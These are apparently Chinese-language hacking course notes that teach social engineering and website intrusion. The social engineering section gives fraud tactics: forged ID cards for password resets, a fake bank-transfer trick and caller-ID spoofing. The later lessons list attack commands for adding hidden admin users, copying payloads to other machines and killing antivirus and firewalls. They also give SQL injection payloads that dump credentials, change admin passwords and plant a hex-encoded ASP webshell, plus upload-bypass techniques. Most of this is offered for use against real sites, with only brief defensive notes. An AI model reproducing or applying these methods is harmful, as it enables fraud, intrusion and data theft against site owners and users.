# 2013-fanke--zonjie--suoyou-

1------了解什么是“社会工程学”


2------whois查询-------www.whois.chinaz.com

3------浏览器---google hacking  /百度



4---------whois查询----查到他的注册网站-----去登陆这个注册网站-----问客服用户名------重置密码-----


5-------------先whois查询到用户名，利用假身份证找回密码（截图给他们（卖域名的商家））---------




6---------利用银行卡转账------跨行转账-----银行社工思路
利用跨行转账，不填写开户行，对方会收到短信
社工终极思路。
 跨行
他会叫你填写开户行
这个时候你不填写开户行
下面有一个对方收到短信，前提是你网银有收购一个网站的钱，
你不填写直接转账，会成功，并且会发送短信到对方手机，对方手机收到，他自然会以为已经交易成功，就会把权限什么的都给你，这个方法
让一个网站的所有权限都丢你了，大家懂了吧。








7------------身份证造假器-------


8----------伪造来电显示---------就是说社工国内客服，电信欺骗，
伪造来电显示。也可以社工他本人，就是说你拿到他的电话，你伪造他公司的电话号码，说你的域名需要更改下DNS或者什么理由，骗到域名解析密码，也可以就是说打给公司让他公司相信你，你是主人，他会告诉你的。


====================================================================================================================================================================================================================================================================================================================================================================================
                                                           入侵篇：


入侵第一课
入侵的简介
通过已知漏洞入侵网站或者服务器
自己挖掘0day入侵网站
0day就是未知的漏洞
渗透跟入侵的区别
渗透是拿到服务器进行整个网段的渗透
拿到整个网段服务器的密码，已经相关人的信息。
以便控制整个网段
而网段是什么
就是说一个192.168.1.1
网段就是192.168.1.1-192.168.1.255
     这个就是网段
额C段嗅探需要的命令则是 arp -a
查看网关
这里都讲到渗透了把
还是回到原来的入侵，入侵就是所谓的攻击网站，拿到网站权限。
 并且可以利用这个网站进行任何操作
明天我们就是说开始第一课 入侵的DOS命令学习，
                  第二课 还是DOS 为什么DOS命令这么重要
                  第三课就是注入
                  注入大概会有8课的样子
                    后面则是利用社会工程学拿到网站权限
                  还有就是说爆破网站的方式拿到网站权限
                  
 渗透的课程我们将进行12课，内网渗透很多


入侵第二课：
入侵第二课
DOS命令的学习
常用命令
net use \\ip\ipc$ " " /user:" " 建立IPC空链接 
net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 
net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
net use h: \\ip\c$ 登陆后映射对方C：到本地为H: 
net use \\ip\ipc$ /del 删除IPC链接 
net use h: /del 删除映射对方到本地的为H:的映射 
net user 用户名　密码　/add 建立用户 
net user guest /active:yes 激活guest用户 
net user 查看有哪些用户 
net user 帐户名 查看帐户的属性 
net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 
net start 查看开启了哪些服务 
net start 服务名　 开启服务；(如:net start telnet， net start schedule) 
net stop 服务名 停止某服务 
net time \\目标ip 查看对方时间 
net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
net view 查看本地局域网内开启了哪些共享 
net view \\ip 查看对方局域网内开启了哪些共享 
net config 显示系统网络设置 
net logoff 断开连接的共享 
net pause 服务名 暂停某服务 
net send ip "文本信息" 向对方发信息 
net ver 局域网内正在使用的网络连接类型和信息 
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net share ipc$ /del 删除ipc$共享 
net share c$ /del 删除C：共享 
net user guest 12345 用guest用户登陆后用将密码改为12345 
net password 密码 更改系统登陆密码 
netstat -a 查看开启了哪些端口,常用netstat -an 
netstat -n 查看端口的网络连接情况，常用netstat -an 
netstat -v 查看正在进行的工作 
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
netstat -s 查看正在使用的所有协议使用情况 
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除
除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件
以外的所有文件




入侵第3课
DOS命令的学习
常用命令
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
move 盘符\路径\要移动的文件名　存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令 
at id号 开启已注册的某个计划任务 
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
at id号 /delete 停止某个已注册的计划任务 
at 查看所有的计划任务 
at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
finger username @host 查看最近有哪些用户登陆 
telnet ip 端口 远和登陆服务器,默认端口为23 
open ip 连接到IP（属telnet登陆后的命令） 
telnet 在本机上直接键入telnet 将进入本机的telnet 
copy 路径\文件名1　路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
copy c:\srv.exe \\ip\admin$ 复制本地c:\srv.exe到对方的admin下 
cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
copy \\ip\admin$\svv.exe c:\ 或:copy\\ip\admin$\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： 
xcopy 要复制的文件或目录树　目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送

tftp -i 对方IP　put c:\server.exe 登陆后，上传本地c:\server.exe至主机 
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
mem 查看cpu使用情况 
attrib 文件名(目录名) 查看某文件（目录）的属性 
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次环梦适奔洌?T:W上次被修改时间 
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 
set 指定环境变量名称=要指派给变量的字符 设置环境变量 
set 显示当前所有的环境变量 
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
pause 暂停批处理程序，并显示出：请按任意键继续.... 
if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） 
call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
echo 信息 在屏幕上显示出信息 
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
find 文件名 查找某文件 
title 标题名字 更改CMD窗口标题名字 
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )
#3 三： 

ver 在DOS窗口下显示版本信息 
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
md　目录名 创建目录 
replace 源文件　要替换文件的目录 替换文件 
ren 原文件名　新文件名 重命名文件名 
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
type 文件名 显示文本文件的内容 
more 文件名 逐屏显示输出文件 
doskey 要锁定的命令＝字符 
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
taskmgr 调出任务管理器 
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径\可执行文件的文件名 为可执行文件设置一个路径。 
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 

#4 四： 

IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
FTP 命令： (后面有详细说明内容) 
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名
 
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 

#5 五： 

MYSQL 命令： 
mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
（例：mysql -h110.110.110.110 -Uroot -P123456 
注:u与root可以不用加空格，其它也一样） 
exit 退出MYSQL 
mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 
grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 
use mysql； 
show tables; 显示库中的数据表 
describe 表名; 显示数据表的结构 
create database 库名; 建库 
use 库名； 
create table 表名 (字段设定列表)； 建表 
drop database 库名; 
drop table 表名； 删库和删表 
delete from 表名; 将表中记录清空 
select * from 表名; 显示表中的记录 
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 
win2003系统下新增命令（实用部份）： 
shutdown /参数 关闭或重启本地或远程主机。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 
一.对用户操作 
net user 查看有哪些用户 
net user guest /active:yes 激活guest用户 
net user 用户名　密码　/add 建立用户 
net localgroup administrators 用户名 /add 把“用户”添加到管理员中 
使其具有管理员权限 


net start -----查看开启了哪些服务 
net start 服务名-----开启服务 
net stop 服务名------停止某服务 
netstat -an :查看端口的网络连接情况 
ipconfig :查看本地ip地址 

net stop sharedaccess ----关系统自带防火墙 
pskill.exe ravmon -----杀掉瑞星软件 
pskill.exe pfw ----关天网防火墙 
net stop "Symantec AntiVirus"----关于诺顿企业版 
net stop KAVStart------关闭金山杀毒 

向肉鸡上传文件命令: 
第一种方法:tftp 
命令格式:tftp -i 你的公网IP get xx.exe 
第二种方法:ftp 
命令格式: 
echo open xxx.xxx.xxx.xxx>c:\520hack.txt 
echo user>>c:\520hack.txt 
echo pass>>c:\520hack.txt 
echo get aoqi.rar>>c:\520hack.txt 
echo bye>>c:\520hack.txt 
ftp -s:c:\520hack.txt 


入侵第四课
http://baike.baidu.com/view/3896.htm
所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击． 
当应用程序使用输入内容来构造动态sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。sql注入可能导致攻击者使用应用程序登陆在数据库中执行命令。相关的SQL注入可以通过测试工具pangolin进行。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码，根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。
简单的ASP注入 ’ and 1=1 and 1=2
针对网站ASP ACCES 数据库







入侵第五课
www.xxxxx.com/asp?id=123
整形参数判断

    1、直接加'  2、and 1=1  3、 and 1=2
    如果1、3运行异常 2正常就存在注入
字符型判断
    1、直接加'  2、and '1'='1'  3、 and '1'='2'
搜索型： 关键字%' and 1=1 and '%'='%   
        关键字%' and 1=2 and '%'='%
    如果1、3运行异常 2正常就存在注入
获取数据库版本
and (select @@version)>0
获取当前数据库名
and db_name()>0
获取当前数据库用户名
and user>0
and user_name()='dbo'
猜解所有数据库名称
and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0
猜解表的字段名称
and (Select Top 1 col_name(object_id('表名'),1) from sysobjects)>0
and (select top 1 asernaose from admin where id =1)>1
.asp?id=xx having 1=1  其中admin.id就是一个表名admin 一个列名id
.asp?id=xx group by admin.id having 1=1 可以得到列名
.asp?id=xx group by admin.id,admin.username having 1=1 得到另一个列名 页面要和表有联系 
如果知道了表名和字段名就可以爆出准确的值
union select 1,2,username,password,5,6,7,8,9,10,11,12 from usertable where id=6
爆账号
union select min(username),1,1,1，.. from users where username > 'a'
依次循环爆其余的账号
union select min(username),1,1,1,.. from users where username > 'admin'
;begin declare @ret varchar(8000) set @ret=':' select @ret=@ret+' '+username+'/'+password from userstable where username>@ret select @ret as ret into foo end
修改管理员的密码为123
.asp?id=××;update admin set password='123' where id =1
.asp?id=××;insert into admin(asd,..) values(123,..) –就能能往admin中写入123了
rebots.txt
猜解数据库中用户名表的名称
and (select count(*) from 数据库.dbo.表名)>0
若表名存在，则工作正常，否则异常
得到用户名表的名称，基本的实现方法是
1：
and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 )>0 或
and (Select Top 1 name from sysobjects where xtype=’U’ and status>0)>0
  但在异常中却可以发现表的名称。假设发现的表名是xyz，则
2：
and (select top 1 name from 数据库.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'，'..'..))>0
  可以得到第二个用户建立的表的名称，同理就可得到所有用建立的  表的名称
3:
and (select top l name from (select top [N]id,name from bysobjects where  xtype=char(85)) T order  by  id  desc)＞1 Ｎ为数据库中地N个表
利用系统表区分数据库类型
and (select count(*) from  sysobjects)>0 
and (select count(*) from msysobjects)>0
若是SQL-SERVE则第一条,ACCESS则两条都会异常
判断是否有比较高的权限
and 1=(select is_srvrolemember('sysadmin'))
and 1=(select is_srvrolemember('serveradmin')) 
判断当前数据库用户名是否为db_owner:
and 1=(select is_member('db_owner'))
xp_cmdshell
:exec master..xp_cmdshell '要执行的cmd命令'
判断长度
and (select top 1 len(字段) from 表名)>5
爆料出正确值
and (select top 1 asc(substring(字段,1,1)) from 表名)>0
差异备份
//备份数据库到某处
;backup database 数据库名 to disk ='c:\\charlog.bak';--
//创建名为datachar的表
;create table [dbo].[datachar] ([cmd] [image])
  cmd为列名 image 数据类型
//插入值,为一句话木马的16进制形式：<%execute(request("a"))%>
;insert into datachar(cmd)values(0x3C25657865637574652872657175657374282261222929253E)—
//进行差异备份,把不同的信息备份到某处
;backup database 数据库名 to disk='目录' WITH DIFFERENTIAL,FORMAT;--





注入：

　　And (Select count(*) from 表名)<>0 　　猜列名 　　And (Select count（列名） from 表名）<>0 　　或者也可以这样 　　and exists (select * from 表名） 　　and exists (select 列名 from 表名） 　　返回正确的，那么写的表名或列名就是正确 　　这里要注意的是，exists这个不能应用于猜内容上，例如and exists (select len(user) from admin)>3 这样是不行的 　　现在很多人都是喜欢查询里面的内容，一旦iis没有关闭错误提示的，那么就可以利用报错方法轻松获得库里面的内容 　　获得数据库连接用户名：；and user>0 　　这个是小竹提出来的，我这里引用《SQL注入天书》里面的一段话来讲解： 　　－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 　　"重点在and user>0，我们知道，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示是：将nvarchar转换int异常，XXXX不能转换成int" 　　－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 　　看到这里大家明白了吧，报错的原理就是利用SQLserver内置的系统表进行转换查询，转换过程会出错，然后就会显示出在网页上，另外还有类似的and 1=(selet top 1 user from admin），这种语句也是可以爆出来的。；and db_name()>0 则是暴数据库名。 　　一旦关闭了IIS报错，那么还可以用union（联合查询）来查内容，主要语句就是 　　Order by 10 　　And 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin 　　And 1=2 union select 1,2,3,user,5,passwd,7,8,9,10 from admin 　　上面的order by 10主要就是查字段数目，admin就是表名，可以自己猜，user,passwd是列名 　　反正就是返回正确即对，返回异常即错 　　另外还有十分常用的ascll码拆半法 　　先要知道指定列名，例如user里的内容的长度 　　and (select len(user) from admin)=2 就是查询长度为不为2位，返回错误的增加或减少数字，一般这个数字不会太大，太大的就要放弃了，猜也多余 　　后面的逻辑符号可以根据不同要求更改的， 　　>；大于 <；小于 =就是等于咯，更新语句的话，=也可以表示传递符号 <>；就是不等 　　知道了长度后就可以开始猜解了 　　And (Select top 1 asc(mid(user,n,1)) from admin)>100 　　n就是猜解的表名的第几位，最后的长度数字就是刚才猜解出来的列名长度了，And (Select top 1 asc(mid(user,1,1)) from admin)>100 就是猜解user里内容的第一位的ASCLL字符是不是大于100 　　正确的话，那么表示USER第一个字符的ASCLL码大于100，那么就猜>120，返回错误就是介于100－120之间，然后再一步一步的缩少，最终得到正确字符XXX，然后用ASCLL转换器吧这个转换成普通字符就可以了 　　然后就是第二位 And (Select top 1 asc(mid(user,2,1)) from admin)>100 一直猜下去 　　加在url后面，列名表名还是先猜解，返回正确的代表帐号的ascll码大于100，那么就再向前猜，指导报错，把猜出来的ascll码拿去ascll转换器转换就可以了，中文是负数，加上asb取绝对值 　　And (Select top 1 asb(asc(mid(user,n,1))) from admin)>15320 　　得到之后就记得在数字前加-号，不然ASCLL转换器转换不来的，中文在ASCLL码里是-23423这样的，所以猜起来挺麻烦 　　这个猜解速度比较慢，但是效果最好，最具有广泛性
方法2
　　后台身份验证绕过漏洞 　　验证绕过漏洞就是'or'='or'后台绕过漏洞，利用的就是AND和OR的运算规则，从而造成后台脚本逻辑性错误 　　例如管理员的账号密码都是admin，那么再比如后台的数据库查询语句是 　　user=request("user") 　　passwd=request("passwd") 　　sql='select admin from adminbate where user='&'''&user&'''&' and passwd='&'''&passwd&''' 　　那么我使用'or 'a'='a来做用户名密码的话，那么查询就变成了 　　select admin from adminbate where user=''or 'a'='a' and passwd=''or 'a'='a' 　　这样的话，根据运算规则，这里一共有4个查询语句，那么查询结果就是 假or真and假or真，先算and 再算or，最终结果为真，这样就可以进到后台了 　　这种漏洞存在必须要有2个条件，第一个：在后台验证代码上，账号密码的查询是要同一条查询语句，也就是类似 　　sql="select * from admin where username='"&username&'&"passwd='"&passwd&' 　　如果一旦账号密码是分开查询的，先查帐号，再查密码，这样的话就没有办法了。 　　第二就是要看密码加不加密，一旦被MD5加密或者其他加密方式加密的，那就要看第一种条件有没有可以，没有达到第一种条件的话，那就没有戏了
方法3
　　防御方法 　　对于怎么防御SQL注入呢，这个网上很多，我这里讲几个 　　如果自己编写防注代码，一般是先定义一个函数，再在里面写入要过滤的关键词，如select ; “”；from；等，这些关键词都是查询语句最常用的词语，一旦过滤了，那么用户自己构造提交的数据就不会完整地参与数据库的操作。 　　当然如果你的网站提交的数据全部都是数字的，可以使用小竹提供的方法 　　Function SafeRequest(ParaName,ParaType) 　　'--- 传入参数 --- 　　'ParaName：参数名称-字符型 　　'ParaType：参数类型-数字型（1表示以上参数是数字，0表示以上参数为字符） 　　Dim ParaValue 　　ParaValue=Request(ParaName) 　　If ParaType=1 then 　　If not isNumeric(ParaValue) then 　　Response.write "参数" & ParaName & "必须为数字型！" 　　Response.end 　　End if 　　Else 　　ParaValue=replace(ParaValue,"'","''") 　　End if 　　SafeRequest=ParaValue 　　End function 　　然后就用SafeRequest（）来过滤参数 ，检查参数是否为数字，不是数字的就不能通过。
小结
　　SQL注入的手法相当灵活，在注入的时候会碰到很多意外的情况。能不能根据具体情况进行分析，构造巧妙的SQL语句，从而成功获取想要的数据，是高手与“菜鸟”的根本区别。编辑本段常用sql注入语句　　1.判断有无注入点 　　; and 1=1 and 1=2 　　2.猜表一般的表的名称无非是admin adminuser user pass password 等..　　 and 0<>(select count(*) from *) 　　and 0<>(select count(*) from admin) ---判断是否存在admin这张表 　　3.猜帐号数目 如果遇到0< 返回正确页面 1<；返回错误页面说明帐号数目就是1个 　　and 0<(select count(*) from admin) 　　and 1<(select count(*) from admin) 　　4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 　　and 1=(select count(*) from admin where len(*)>0)-- 　　and 1=(select count(*) from admin where len（用户字段名称name)>0) 　　and 1=(select count(*) from admin where len（密码字段名称password)>0) 　　5.猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止 　　and 1=(select count(*) from admin where len(*)>0) 　　and 1=(select count(*) from admin where len(name)>6) 错误 　　and 1=(select count(*) from admin where len(name)>5) 正确 长度是6 　　and 1=(select count(*) from admin where len(name)=6) 正确 　　and 1=(select count(*) from admin where len(password)>11) 正确 　　and 1=(select count(*) from admin where len(password)>12) 错误 长度是12 　　and 1=(select count(*) from admin where len(password)=12) 正确 


入侵第六课
分析网站结构
bbs.fankebase.com
iis6.0
伪静态 HTML
PHP程序	
MYSQL数据库


入侵第7课
学会扫描网站
http://www.28js.com/
http://bugscan.net/
遇见C段查询
明小子
啊D
http://baike.baidu.com/view/5880062.htm



入侵第8课
上传漏洞的介绍
http://baike.baidu.com/view/677607.htm
利用BURP截取文件名,修改文件名
“上传漏洞”入侵是目前对网站最广泛的入侵方法。90%的具有上传页面的网站，都存在上传漏洞。本文将介绍常见的网站上传漏洞及其防范技巧。
 
一、能直接上传asp文件的漏洞
 
如果网站有上传页面，就要警惕直接上传asp文件漏洞。例如去年流行的动网5.0/6.0论坛，就有个upfile.asp上传页面，该页面对上传文件扩展名过滤不严，导致黑客能直接上传asp文件，因此黑客只要打开upfile.asp页，直接上传，asp木马即可拿到webshell、拥有网站的管理员控制权。
 
除此之外，目前已发现的上传漏洞，还有动感购物商城、动力上传漏洞、乔客上传漏洞等，只要运行“明小子Domain3.5”，点击“综合上传”，即可看到这些著名的上传漏洞。
 
像明小子这样的上传漏洞利用工具如今还有很多，例如上传漏洞程序4in1、动易2005上传漏洞利用工具、雷池新闻系统上传漏洞利用工具、MSSQL上传漏洞利用工具等等，使用此类工具，只需填写上传页面网址和Cookies，即可成功入侵网站。
 
【防范方法】：为了防范此类漏洞，建议网站采用最新版（例如动网7.1以上版本）程序建站，因为最新版程序一般都没有直接上传漏洞，当然删除有漏洞的上传页面，将会最安全，这样黑客再也不可能利用上传漏洞入侵了！
 
如果不能删除上传页面，为了防范入侵，建议在上传程序中添加安全代码，禁止上传asp\asa\js\exe\com等类文件，这需要管理者能看懂asp程序。
 
二、00上传漏洞
 
目前网上流行的所有无组件上传类都存在此类漏洞——即黑客利用“抓包嗅探”、“ULTRAEDIT”和“网络军刀”等工具伪造IP包，突破服务器端对上传文件名、路径的判断，巧妙上传ASP、ASA、CGI、CDX、CER、ASPX类型的木马。
 
例如黑客上传了一个木马文件（xiaomm.asp空格.jpg），由于上传程序不能正确判断含有十六进制00的文件名或路径，于是就出现了漏洞，当上传程序接收到“xiaomm.asp空格.jpg”文件名数据时，一旦发现xiaomm.asp后面还有空格（十六进制的00），它就不会再读下去，于是上传的文件在服务器上就会被保存成xiaomm.asp，因此上传木马就成功了！
 
【防范方法】：最安全的防范办法就是删除上传页面。
 
三、图片木马上传漏洞
 
有的网站（例如动网7.1SP1博客功能），其后台管理中可以恢复/备份数据库，这会被黑客用来进行图片木马入侵。
 
图片木马入侵过程如下：首先将本地木马（例如F:\labxw\xiaomm.asp）扩展名改为.gif，然后打开上传页面，上传这个木马（例如F:\labxw\xiaomm.gif）；再通过注入法拿到后台管理员的账号密码，溜进网站后台管理中，使用备份数据库功能将.gif木马备份成.asp木马（例如xiaomm.asp），即在“备份数据库路径（相对）”输入刚才图片上传后得到的路径，在“目标数据库路径”输入：xiaomm.asp，提示恢复数据库成功；现在打开IE，输入刚才恢复数据库的asp路径，木马就能运行了。
 
【防范方法】：删除后台管理中的恢复/备份数据库功能。
 
四、添加上传类型漏洞
 
如今大多数论坛后台中都允许添加上传类型，这也是个不小的漏洞！只要黑客用注入法拿到后台管理员账号密码，然后进入后台添加上传类型，在上传页面中就能直接上传木马！
 
